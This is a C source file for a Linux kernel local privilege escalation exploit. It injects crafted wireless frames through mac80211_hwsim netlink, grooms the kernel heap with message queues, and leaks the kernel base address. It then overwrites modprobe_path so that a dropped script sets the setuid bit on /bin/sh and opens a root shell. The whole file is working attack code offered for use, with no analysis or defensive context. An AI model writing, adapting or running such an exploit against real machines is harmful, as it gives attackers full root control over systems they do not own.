/*
 *  gcc -o xpl xpl.c $(pkg-config --cflags --libs libnl-3.0 libnl-genl-3.0 libpcap)
 */

#include <stdio.h>
#include <stdlib.h>
#include <netlink/netlink.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>

#include <pcap/pcap.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>

#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <net/if.h>

#define HWSIM_CMD_REGISTER 1
#define HWSIM_CMD_FRAME 2

#define HWSIM_ATTR_ADDR_RECEIVER 1
#define HWSIM_ATTR_FRAME 3
#define HWSIM_ATTR_RX_RATE 5
#define HWSIM_ATTR_SIGNAL 6

#define CHECK(call) do { if (call) { fprintf(stderr, "pcap failure: %s\n", errbuf); return 2; } } while (0)

#define HEADER_SZ 0x30
#define MTEXT_STAGE1_SIZE 0x60
#define MTEXT_STAGE2_SIZE 0x80
#define MSIZE MTEXT_STAGE1_SIZE-HEADER_SZ
#define MSG_COPY 040000
#define SHELL "/bin/sh"

#define DO_MSG_COPY 1
#define DO_MODPROBE_OVERWRITE 2

static int family;

int qid[8];

char *root_argv[] = {"-p", NULL};
char *modprobe_win = "/tmp/w\x00"; 
char *dummy_file = "/tmp/d\x00";

struct nl_sock *sk;

struct {
    long mtype;
    char mtext[MSIZE];
} msg;

void setup() {
	int sockfd;
	struct ifreq ifr;
	int err, idx;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		printf("Can't open socket to reset adapters");
		exit(1);
	}

	sk = nl_socket_alloc();
	if (!sk) {
		printf("Failed to allocate socket");
		exit(1);
	}
	if (genl_connect(sk) < 0) {
		printf("Failed to connect socket");
		exit(1);
	}

	family = genl_ctrl_resolve(sk, "MAC80211_HWSIM");
	err = genl_send_simple(sk, family, HWSIM_CMD_REGISTER, 1, 0);
	if (err < 0) {
		printf("Error while registering: %s\n", nl_geterror(err));
		exit(1);
	}

	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, "wlan0", IFNAMSIZ);
	ifr.ifr_flags |= IFF_UP;
	ioctl(sockfd, SIOCSIFFLAGS, &ifr);

	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, "hwsim0", IFNAMSIZ);
	ifr.ifr_flags |= IFF_UP;
	ioctl(sockfd, SIOCSIFFLAGS, &ifr);
}

void send_msg(int qid, int size, int c, int type, int do_modprobe_overwrite, char *s) {
    struct {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = type;
	if (do_modprobe_overwrite) {
		memcpy(msg.mtext, s, 6);
	} else {
	    memset(msg.mtext, c, sizeof(msg.mtext));
	}

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1) {
        perror("msgsnd");
        exit(1);
    }
}

void *recv_msg(int qid, size_t size, int type, int do_msg_copy) {
    void *memdump = malloc(size);
	if (do_msg_copy) {
		int r = msgrcv(qid, memdump, size, type, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
		if ( r == -1) {
			perror("msgrcv");
			return NULL;
		} else if (r != 0xf00) {
			return NULL;
		}
	} else {
		if (msgrcv(qid, memdump, size, type, 0) == -1) {
			perror("msgrcv");
			return NULL;
		}
	}

    return memdump;
}

void heap_groom(int size, int n, int type) {
	struct {
		long mtype;
		char mtext[size - 0x30];
    } msg;

    msg.mtype = 1;
	int mqids[n];
    memset(msg.mtext, 0x21, sizeof(msg.mtext));
	for (int i = 0; i < n; i++) {
		mqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		if (msgsnd(mqids[i], &msg, sizeof(msg.mtext), 0) != 0)
				printf("[*] Error with msgsnd %d in heap_groom\n", mqids[i]);
	}
	for (int i = 0; i < n; i++) {
		if (msgrcv(mqids[i], &msg.mtext, sizeof(msg.mtext), 0, 0) == -1)
			printf("[*] Error with msgrcv %d in heap_groom\n", mqids[i]);
	}
}

static void handle_pkt(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	struct nl_msg *msg = nlmsg_alloc_simple(10, 0);
	struct nl_sock *sk = (void *)user;
	int err;
	genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family,
			0, 0, HWSIM_CMD_FRAME, 1);
	nla_put(msg, HWSIM_ATTR_ADDR_RECEIVER, 6, "\x42\x00\x00\x00\x00\x00"); 
	nla_put_u32(msg, HWSIM_ATTR_RX_RATE, 0);
	nla_put_u32(msg, HWSIM_ATTR_SIGNAL, -60);
	nla_put(msg, HWSIM_ATTR_FRAME, h->caplen, bytes);
	err = nl_send_auto(sk, msg);
	if (err < 0)
		printf("Can't send msg: %s\n", nl_geterror(err));
	nlmsg_free(msg);
}

int make_queue() {
	int id = -1;
	if ((id = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(1);
	}
	return id;
}

void prepare_second_payload(unsigned long modprobe_leak, char* pcap_file) {
    FILE *fp;
    char *buffer;
    long file_size;

    fp = fopen(pcap_file, "rw");
    if (fp == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    rewind(fp);

    buffer = (char *)malloc((file_size + 1) * sizeof(char));
    if (buffer == NULL) {
        printf("Error allocating memory!\n");
        exit(1);
    }
    fread(buffer, sizeof(char), file_size, fp);
    buffer[file_size] = '\0';

    fclose(fp);
    for (int i = 0x4a2; i < 0x6fa; i += 8) {
    	buffer[i] = (modprobe_leak >> (8*0)) & 0xff;
        buffer[i+1] = (modprobe_leak >> (8*1)) & 0xff;
        buffer[i+2] = (modprobe_leak >> (8*2)) & 0xff;
        buffer[i+3] = (modprobe_leak >> (8*3)) & 0xff;
        buffer[i+4] = (modprobe_leak >> (8*4)) & 0xff;
        buffer[i+5] = (modprobe_leak >> (8*5)) & 0xff;
        buffer[i+6] = (modprobe_leak >> (8*6)) & 0xff;
        buffer[i+7] = (modprobe_leak >> (8*7)) & 0xff;
    }
    fp = fopen(pcap_file, "wb");
    if (fp == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fwrite(buffer, 1, file_size, fp);
    fclose(fp);
    free(buffer);
}

unsigned long search_for_leak(char *buff, unsigned long size) {
	int i;
	for (i = 0; i < size/8; i++) {
		unsigned long ptr = ((unsigned long *)(buff))[i];
		int test1 = (ptr - 0x7ac70) >> (8*0) & 0xFF;
		int test2 = (ptr - 0x7ac70) >> (8*1) & 0xFF;
		if (test1 == 0 && test2 == 0) {
			printf("[+] Found base: 0x%016lx\n", ptr);
			unsigned long base = 0;
			base = ptr - 0x7ac70;
			return base;
		}
	}
	return 0;
}

void modprobe_init()
{
    int fd = open(dummy_file, O_RDWR | O_CREAT);
    if (fd < 0)
    {
        perror("[*] dummy_file creation failed");
        exit(-1);
    }

    char bad_magic[] = "\xff\xff\xff\xff";
    write(fd, bad_magic, sizeof(bad_magic));
    close(fd);

    char w[] = "#!/bin/sh\nchmod 4755 " SHELL "\n && chown root:root " SHELL "\n && chmod u+s " SHELL "\n";
    
	if (chmod(dummy_file, 0777) < 0) {
        puts("[!] Failed to chmod dummy_file");
        exit(-1);
    };

    fd = open(modprobe_win, O_RDWR | O_CREAT);
    if (fd < 0)
    {
        perror("[*] modprobe_win creation failed");
        exit(-1);
    }

    write(fd, w, sizeof(w));
    close(fd);

    if (chmod(modprobe_win, 0777) < 0) {
        puts("[!] Failed to chmod modprobe_win");
        exit(-1);
    };

    return;
}

void trigger_modprobe()
{
    puts("[*] Triggering modprobe via dummy file");
    execve(dummy_file, NULL, NULL);
    return;
}

int main(int argc, char **argv) {
	printf("[*] Initial network setup\n");
	setup();
	modprobe_init();

	if (argc < 3) {
		fprintf(stderr, "Usage: %s <pcap1> <pcap2> \n", argv[0]);
		return 2;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	CHECK(pcap_init(1, errbuf));

	int n = 32;
	int stage_one_msg_type = 1;
	unsigned long kaddr = 0;

	heap_groom(MTEXT_STAGE1_SIZE, 80, stage_one_msg_type);
	printf("[*] Spraying kmalloc-96 msg objects\n");
	qid[0] = make_queue();
	qid[1] = make_queue();

	for (int i = 0; i < n; i++) {
		send_msg(qid[0], MTEXT_STAGE1_SIZE, 0x30+i, i+1, 0, 0);
	}

	printf("[*] Create hole at msg ID #28\n");
	recv_msg(qid[0], MTEXT_STAGE1_SIZE, 28, 0);
	
	printf("[*] Spraying subprocess_info objects\n");
	for (int i = 0; i < 16; i++) {
		socket(22, AF_INET, 0);
	}
	
	printf("[*] Create hole at msg ID #16\n");
	recv_msg(qid[0], MTEXT_STAGE1_SIZE, 16, 0);
	
	printf("[*] Sending packet #1\n");
	pcap_t *input = pcap_open_offline(argv[1], errbuf);
	int r = pcap_loop(input, 2, handle_pkt, (void *)sk);

	if (r == 0) {
		printf("[*] Checking for leak\n");
		for (int i = 0; i < n; i++) {
			char *leak = recv_msg(qid[0], 0xf00, i+1, DO_MSG_COPY);
			if (leak != NULL) {
				kaddr = search_for_leak(leak, 0xf00);
				memset(leak, 0x0, 0xf00);
				free(leak);
				leak = NULL; 
				if (kaddr != 0) {
					printf("[*] Kernel base: 0x%016lx\n", kaddr);
					break;
				}
			}
		}
	}
	
	unsigned long modprobe_path = (kaddr + 0x164dac0) - 0x30; 
	prepare_second_payload(modprobe_path, argv[2]);

	if (kaddr != 0) {
		int stage_two_msg_type = 4141;
		heap_groom(MTEXT_STAGE2_SIZE, 80, stage_two_msg_type);
		printf("[*] Sending packet #2\n");
		pcap_t *input2 = pcap_open_offline(argv[2], errbuf);
		int r2 = pcap_loop(input2, 2, handle_pkt, (void *)sk);
		if (r2 == 0) {
			printf("[*] Spraying messages for each queue\n");
			for (int i = 0; i < 80; i++) {
				send_msg(qid[1], MTEXT_STAGE2_SIZE, 0, stage_two_msg_type, DO_MODPROBE_OVERWRITE, modprobe_win);
			}
			trigger_modprobe();
			struct stat check;
			if (stat(SHELL, &check) < 0)
			{
				perror("[-] Error on checking /bin/dash permissions");
				exit(-1);
			}
			if (check.st_mode & S_ISUID)
			{
				printf("[*] We are root\n");
				execve(SHELL, root_argv, NULL);
			}
		}
	}
}
